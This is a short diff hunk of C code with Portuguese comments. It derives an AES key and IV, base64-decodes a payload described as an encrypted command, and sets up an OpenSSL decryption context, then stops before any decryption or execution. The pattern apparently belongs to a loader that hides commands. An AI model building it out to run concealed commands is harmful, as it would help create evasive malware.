@@ -107,7 +107,16 @@ int main() {
     memcpy(aes_key, key_iv, 32);
     memcpy(aes_iv, key_iv + 32, 16);
 
-  
+    // Decodifica payload (AES-encrypted comando)
+    int payload_len;
+    unsigned char *payload_enc = base64_decode(payload_b64, &payload_len);
+
+    // Descriptografa o comando
+    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
+    unsigned char plaintext[1024];
+    int len, plaintext_len;
+
+
 
     return 0;
 }
